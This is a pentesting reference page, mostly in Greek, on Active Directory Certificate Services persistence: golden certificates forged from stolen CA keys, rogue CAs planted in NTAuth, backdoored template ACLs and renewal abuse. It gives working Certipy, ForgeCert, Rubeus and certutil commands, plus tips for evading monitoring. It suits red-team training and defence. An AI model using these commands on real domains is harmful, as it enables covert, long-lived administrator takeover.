# Επιμονή στο Domain του AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή είναι μια περίληψη των τεχνικών επιμονής στο domain που μοιράζονται στο [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Δείτε το για περισσότερες λεπτομέρειες.

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

Πώς μπορείτε να καταλάβετε ότι ένα πιστοποιητικό είναι CA πιστοποιητικό;

Μπορεί να προσδιοριστεί ότι ένα πιστοποιητικό είναι CA εάν ικανοποιούνται αρκετές προϋποθέσεις:

- Το πιστοποιητικό είναι αποθηκευμένο στον CA server, με το ιδιωτικό του κλειδί να προστατεύεται από το DPAPI του μηχανήματος, ή από hardware όπως TPM/HSM εάν το λειτουργικό σύστημα το υποστηρίζει.
- Τα πεδία Issuer και Subject του πιστοποιητικού αντιστοιχούν στο distinguished name του CA.
- Μια επέκταση "CA Version" υπάρχει αποκλειστικά στα CA certificates.
- Το πιστοποιητικό δεν έχει πεδία Extended Key Usage (EKU).

Για να εξαχθεί το ιδιωτικό κλειδί αυτού του πιστοποιητικού, το εργαλείο `certsrv.msc` στον CA server είναι η υποστηριζόμενη μέθοδος μέσω του ενσωματωμένου GUI. Παρόλα αυτά, αυτό το πιστοποιητικό δεν διαφέρει από άλλα που είναι αποθηκευμένα στο σύστημα· επομένως, μέθοδοι όπως η [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) μπορούν να εφαρμοστούν για την εξαγωγή.

Το πιστοποιητικό και το ιδιωτικό κλειδί μπορούν επίσης να αποκτηθούν χρησιμοποιώντας Certipy με την ακόλουθη εντολή:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Αφού αποκτήσετε το πιστοποιητικό CA και το ιδιωτικό του κλειδί σε μορφή `.pfx`, εργαλεία όπως το [ForgeCert](https://github.com/GhostPack/ForgeCert) μπορούν να χρησιμοποιηθούν για να δημιουργήσουν έγκυρα πιστοποιητικά:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Ο χρήστης που στοχεύεται για πλαστογράφηση πιστοποιητικού πρέπει να είναι ενεργός και να μπορεί να αυθεντικοποιηθεί στο Active Directory για να επιτύχει η διαδικασία. Η πλαστογράφηση πιστοποιητικού για ειδικούς λογαριασμούς όπως ο krbtgt είναι αναποτελεσματική.

Αυτό το πλαστογραφημένο πιστοποιητικό θα είναι **έγκυρο** μέχρι την καθορισμένη ημερομηνία λήξης και όσο το root CA certificate είναι έγκυρο (συνήθως από 5 έως **10+ χρόνια**). Είναι επίσης έγκυρο για **machines**, οπότε σε συνδυασμό με **S4U2Self**, ένας επιτιθέμενος μπορεί να **διατηρήσει persistence σε οποιαδήποτε domain machine** για όσο το CA certificate είναι έγκυρο.\
Επιπλέον, τα **πιστοποιητικά που δημιουργούνται** με αυτή τη μέθοδο **δεν μπορούν να ανακληθούν** καθώς το CA δεν είναι ενήμερο για αυτά.

### Λειτουργία υπό Strong Certificate Mapping Enforcement (2025+)

Από τις 11 Φεβρουαρίου 2025 (μετά την κυκλοφορία του KB5014754), οι domain controllers έχουν ως προεπιλογή **Full Enforcement** για τα certificate mappings. Στην πράξη αυτό σημαίνει ότι τα πλαστογραφημένα πιστοποιητικά σας πρέπει είτε:

- Να περιέχουν μια ισχυρή σύνδεση με τον λογαριασμό-στόχο (για παράδειγμα, την SID security extension), ή
- Να συνδυάζονται με έναν ισχυρό, ρητό mapping στο `altSecurityIdentities` attribute του αντικειμένου-στόχου.

Μια αξιόπιστη προσέγγιση για persistence είναι να δημιουργήσετε ένα πλαστογραφημένο πιστοποιητικό συνδεδεμένο με την κλεμμένη Enterprise CA και στη συνέχεια να προσθέσετε ένα ισχυρό ρητό mapping στο victim principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Σημειώσεις
- Αν μπορείτε να φτιάξετε forged certificates που περιλαμβάνουν την επέκταση ασφάλειας SID, αυτά θα αντιστοιχούν έμμεσα ακόμα και υπό Full Enforcement. Διαφορετικά, προτιμήστε ρητές και ισχυρές αντιστοιχίσεις. Δείτε [account-persistence](account-persistence.md) για περισσότερα σχετικά με ρητές αντιστοιχίσεις.
- Η ανάκληση δεν βοηθά τους υπερασπιστές εδώ: τα forged certificates είναι άγνωστα στη βάση δεδομένων του CA και συνεπώς δεν μπορούν να ανακληθούν.

#### Full-Enforcement compatible forging (SID-aware)

Ενημερωμένα εργαλεία επιτρέπουν την ενσωμάτωση του SID απευθείας, διατηρώντας τα golden certificates λειτουργικά ακόμα και όταν οι DCs απορρίπτουν αδύναμες αντιστοιχίσεις:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
Ενσωματώνοντας το SID, αποφεύγετε να τροποποιήσετε το `altSecurityIdentities`, το οποίο μπορεί να παρακολουθείται, διατηρώντας ταυτόχρονα τους ελέγχους ισχυρής αντιστοίχισης.

## Trusting Rogue CA Certificates - DPERSIST2

Το αντικείμενο `NTAuthCertificates` έχει οριστεί να περιέχει ένα ή περισσότερα **CA certificates** στο attribute `cacertificate`, το οποίο χρησιμοποιεί το Active Directory (AD). Η διαδικασία επαλήθευσης από τον **domain controller** ελέγχει το αντικείμενο `NTAuthCertificates` για μια εγγραφή που να ταιριάζει με την **CA** που αναφέρεται στο πεδίο Issuer του πιστοποιητικού που πραγματοποιεί την αυθεντικοποίηση. Αν βρεθεί ταύτιση, η αυθεντικοποίηση προχωρά.

Ένα αυτο-υπογεγραμμένο CA certificate μπορεί να προστεθεί στο αντικείμενο `NTAuthCertificates` από έναν επιτιθέμενο, εφόσον έχει έλεγχο πάνω σε αυτό το AD αντικείμενο. Κανονικά, μόνο μέλη της ομάδας **Enterprise Admin**, μαζί με τους **Domain Admins** ή τους **Administrators** στο **forest root’s domain**, έχουν άδεια να τροποποιήσουν αυτό το αντικείμενο. Μπορούν να επεξεργαστούν το αντικείμενο `NTAuthCertificates` χρησιμοποιώντας `certutil.exe` με την εντολή `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, ή χρησιμοποιώντας το [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Επιπλέον χρήσιμες εντολές για αυτήν την τεχνική:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Αυτή η δυνατότητα είναι ιδιαίτερα σχετική όταν χρησιμοποιείται σε συνδυασμό με μια προηγουμένως περιγραφείσα μέθοδο που περιλαμβάνει το ForgeCert για δυναμική δημιουργία πιστοποιητικών.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Οι ευκαιρίες για **persistence** μέσω **security descriptor modifications of AD CS** συστατικών είναι άφθονες. Οι τροποποιήσεις που περιγράφονται στην "[Domain Escalation](domain-escalation.md)" ενότητα μπορούν να υλοποιηθούν κακόβουλα από έναν attacker με αυξημένη πρόσβαση. Αυτό περιλαμβάνει την προσθήκη "control rights" (π.χ., WriteOwner/WriteDACL/etc.) σε ευαίσθητα συστατικά όπως:

- Το αντικείμενο του **CA server’s AD computer**.
- Ο **CA server’s RPC/DCOM server**.
- Οποιοδήποτε **descendant AD object or container** μέσα στο **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (για παράδειγμα, το Certificate Templates container, το Certification Authorities container, το αντικείμενο NTAuthCertificates, κ.λπ.).
- **AD groups delegated rights to control AD CS** από προεπιλογή ή από τον οργανισμό (όπως η ενσωματωμένη Cert Publishers group και οποιοδήποτε από τα μέλη της).

Ένα παράδειγμα κακόβουλης υλοποίησης θα περιλάμβανε έναν attacker, που έχει **αυξημένα δικαιώματα** στον domain, να προσθέτει την άδεια **`WriteOwner`** στο προεπιλεγμένο πρότυπο πιστοποιητικού **`User`**, με τον attacker να είναι ο principal για το δικαίωμα. Για να το εκμεταλλευτεί, ο attacker θα άλλαζε πρώτα την ιδιοκτησία του προτύπου **`User`** στον εαυτό του. Κατόπιν, η τιμή του **`mspki-certificate-name-flag`** θα οριζόταν σε **1** στο πρότυπο για να ενεργοποιήσει το **`ENROLLEE_SUPPLIES_SUBJECT`**, επιτρέποντας σε έναν χρήστη να παρέχει ένα Subject Alternative Name στο request. Στη συνέχεια, ο attacker θα μπορούσε να **enroll** χρησιμοποιώντας το **template**, επιλέγοντας ένα όνομα **domain administrator** ως alternative name, και να χρησιμοποιήσει το αποκτηθέν πιστοποιητικό για authentication ως DA.

Πρακτικοί επιλογείς που μπορεί να ρυθμίσουν οι attackers για μακροχρόνια persistence στον domain (δείτε {{#ref}}domain-escalation.md{{#endref}} για πλήρεις λεπτομέρειες και detection):

- Σημαίες πολιτικής CA που επιτρέπουν SAN από requesters (π.χ., ενεργοποίηση του `EDITF_ATTRIBUTESUBJECTALTNAME2`). Αυτό κρατάει ESC1-like paths εκμεταλλεύσιμα.
- Template DACL ή ρυθμίσεις που επιτρέπουν authentication-capable issuance (π.χ., προσθήκη Client Authentication EKU, ενεργοποίηση του `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Έλεγχος του αντικειμένου `NTAuthCertificates` ή των CA containers για συνεχή επανεισαγωγή rogue issuers εάν οι defenders προσπαθήσουν cleanup.

[!TIP]
In hardened environments after KB5014754, pairing these misconfigurations with explicit strong mappings (`altSecurityIdentities`) ensures your issued or forged certificates remain usable even when DCs enforce strong mapping.

### Certificate renewal abuse (ESC14) for persistence

If you compromise an authentication-capable certificate (or an Enrollment Agent one), you can **renew it indefinitely** as long as the issuing template remains published and your CA still trusts the issuer chain. Renewal keeps the original identity bindings but extends validity, making eviction difficult unless the template is fixed or the CA is republished.
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Εάν οι domain controllers βρίσκονται σε **Πλήρη Εφαρμογή**, προσθέστε `-sid <victim SID>` (ή χρησιμοποιήστε ένα template που εξακολουθεί να περιλαμβάνει την SID security extension) ώστε το ανανεωμένο leaf certificate να συνεχίσει να αντιστοιχίζεται ισχυρά χωρίς να πειράζετε τα `altSecurityIdentities`. Επιτιθέμενοι με δικαιώματα CA admin μπορούν επίσης να τροποποιήσουν το `policy\RenewalValidityPeriodUnits` για να επιμηκύνουν τη διάρκεια ζωής των ανανεώσεων πριν εκδώσουν οι ίδιοι ένα cert.


## Αναφορές

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
